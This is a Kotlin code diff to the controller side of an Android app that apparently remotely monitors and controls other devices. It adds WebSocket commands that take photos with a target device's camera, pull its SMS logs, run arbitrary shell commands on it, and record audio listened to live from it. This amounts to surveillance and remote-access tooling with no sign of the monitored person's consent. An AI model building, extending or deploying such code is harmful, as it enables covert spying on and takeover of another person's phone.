@@ -35,7 +35,8 @@ class DeviceDetailViewModel @Inject constructor(
     savedStateHandle: SavedStateHandle,
     private val deviceRepository: DeviceRepository,
     private val audioRepository: AudioRepository,
-    private val audioMonitor: AudioMonitor
+    private val audioMonitor: AudioMonitor,
+    private val webSocketDataSource: com.sentinel.admin.data.remote.websocket.WebSocketDataSource
 ) : ViewModel() {
 
     private val deviceId: String = savedStateHandle.get<String>("deviceId")
@@ -48,6 +49,7 @@ class DeviceDetailViewModel @Inject constructor(
         loadDevice()
         observeAudioState()
         observeLiveUpdates()
+        observeCommandResults()
     }
 
     /**
@@ -134,8 +136,24 @@ class DeviceDetailViewModel @Inject constructor(
     }
 
     fun onStopClick() {
+        if (audioMonitor.isRecording.value) {
+            audioMonitor.stopRecording()
+        }
         audioRepository.stopListening(deviceId)
         audioMonitor.stop()
+    }
+
+    fun toggleRecording(context: android.content.Context) {
+        if (audioMonitor.isRecording.value) {
+            audioMonitor.stopRecording()
+        } else {
+            val recordingsDir = java.io.File(context.getExternalFilesDir(null), "Recordings")
+            if (!recordingsDir.exists()) recordingsDir.mkdirs()
+
+            val timestamp = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
+            val targetFile = java.io.File(recordingsDir, "REC_${deviceId}_$timestamp.wav")
+            audioMonitor.startRecording(targetFile)
+        }
     }
 
     // ============================================================
@@ -151,6 +169,143 @@ class DeviceDetailViewModel @Inject constructor(
         viewModelScope.launch {
             audioMonitor.statistics.collect { stats ->
                 _uiState.update { it.copy(audioStats = stats) }
+            }
+        }
+        viewModelScope.launch {
+            audioMonitor.isRecording.collect { isRec ->
+                _uiState.update { it.copy(isRecording = isRec) }
+            }
+        }
+        viewModelScope.launch {
+            audioMonitor.recordingDurationMs.collect { duration ->
+                _uiState.update { it.copy(recordingDurationMs = duration) }
+            }
+        }
+    }
+
+    // ============================================================
+    // Air Commands Execution & Listening
+    // ============================================================
+
+    fun sendSystemInfoCommand() {
+        sendCommand("GET_SYSTEM_INFO")
+    }
+
+    fun sendTriggerBeaconCommand() {
+        sendCommand("TRIGGER_BEACON")
+    }
+
+    fun sendCapturePhotoCommand(useFront: Boolean = false) {
+        val params = org.json.JSONObject().apply { put("front", useFront) }
+        sendCommand("CAPTURE_PHOTO", params)
+    }
+
+    fun sendFetchLogsCommand() {
+        sendCommand("FETCH_SMS_LOGS")
+    }
+
+    fun sendExecuteShellCommand(commandText: String) {
+        val params = org.json.JSONObject().apply { put("cmd", commandText) }
+        sendCommand("EXECUTE_SHELL", params)
+    }
+
+    fun dismissDialogs() {
+        _uiState.update {
+            it.copy(
+                showDiagnosticsDialog = false,
+                showPhotoDialog = false,
+                showShellDialog = false,
+                showLogsDialog = false,
+                commandStatusMessage = null
+            )
+        }
+    }
+
+    private fun sendCommand(command: String, params: org.json.JSONObject = org.json.JSONObject()) {
+        val commandJson = org.json.JSONObject().apply {
+            put("type", "COMMAND")
+            put("version", 1)
+            put("timestamp", System.currentTimeMillis() / 1000)
+            put("sequence", System.currentTimeMillis())
+
+            val data = org.json.JSONObject().apply {
+                put("targetDeviceId", deviceId)
+                put("command", command)
+                put("params", params)
+            }
+            put("data", data)
+        }
+
+        webSocketDataSource.sendText(commandJson.toString())
+    }
+
+    private fun observeCommandResults() {
+        viewModelScope.launch {
+            webSocketDataSource.textMessages.collect { rawText ->
+                try {
+                    val json = org.json.JSONObject(rawText)
+                    if (json.optString("type") != "COMMAND_RESULT") return@collect
+
+                    val data = json.optJSONObject("data") ?: return@collect
+                    val command = data.optString("command")
+                    val success = data.optBoolean("success", false)
+                    val payload = data.optJSONObject("payload") ?: org.json.JSONObject()
+
+                    if (!success) {
+                        _uiState.update {
+                            it.copy(commandStatusMessage = "Command failed: ${data.optString("error")}")
+                        }
+                        return@collect
+                    }
+
+                    when (command) {
+                        "GET_SYSTEM_INFO" -> {
+                            val map = mutableMapOf<String, Any>()
+                            payload.keys().forEach { k -> map[k] = payload.get(k) }
+                            _uiState.update {
+                                it.copy(showDiagnosticsDialog = true, diagnosticsData = map)
+                            }
+                        }
+
+                        "CAPTURE_PHOTO" -> {
+                            val imageBase64 = payload.optString("imageBase64")
+                            val facing = payload.optString("cameraFacing", "REAR")
+                            _uiState.update {
+                                it.copy(
+                                    showPhotoDialog = true,
+                                    capturedPhotoBase64 = imageBase64,
+                                    capturedPhotoFacing = facing
+                                )
+                            }
+                        }
+
+                        "EXECUTE_SHELL" -> {
+                            val output = payload.optString("output", "No output")
+                            _uiState.update {
+                                it.copy(showShellDialog = true, shellOutput = output)
+                            }
+                        }
+
+                        "FETCH_SMS_LOGS" -> {
+                            val jsonArray = payload.optJSONArray("logs")
+                            val logs = mutableListOf<String>()
+                            if (jsonArray != null) {
+                                for (i in 0 until jsonArray.length()) {
+                                    logs.add(jsonArray.getString(i))
+                                }
+                            }
+                            _uiState.update {
+                                it.copy(showLogsDialog = true, logsList = logs)
+                            }
+                        }
+
+                        "TRIGGER_BEACON" -> {
+                            _uiState.update {
+                                it.copy(commandStatusMessage = "Beacon triggered on Host device successfully!")
+                            }
+                        }
+                    }
+                } catch (_: Exception) {}
             }
         }
     }
